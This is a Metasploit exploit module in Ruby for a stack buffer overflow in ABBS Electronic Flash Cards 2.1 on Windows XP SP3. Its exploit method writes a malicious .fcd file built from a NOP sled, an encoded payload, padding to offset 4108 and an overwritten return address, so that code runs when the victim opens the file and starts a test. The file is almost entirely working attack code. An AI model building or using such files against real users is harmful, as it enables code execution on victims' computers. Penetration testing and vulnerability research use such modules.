##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ABBS Electronic Flash Cards 2.1 (FCD File) Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow vulnerability
					found in ABBS Electronic Flash Cards 2.1. 
					The overflow occurs when an overly long string is passed
					in the fcd file. To execute this fcd file the victim
					has to start to start a new "random" test.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 
					      'h1ch4m',		# Initial Discovery
					      'James Fitts'	# Metasploit Module
					    ],
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/16977' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'BadChars' => "\x00\x0a\x0d",
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 
						'Windows XP SP3 EN', 
						{ 
							'Ret' => 0x0043cb0f, # call dword ptr ds:[eax] in flashcards.exe
							'Offset' => 4108
						} 
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Mar 14 2011',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [ true, 'The file name.',  'msf.fcd']),
				], self.class)
	end

	def exploit
		
		fcd = make_nops(50)
		fcd << payload.encoded
		fcd << make_nops(target['Offset'] - (50 + payload.encoded.length))
		fcd << [target.ret].pack('V')

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(fcd)

	end

end
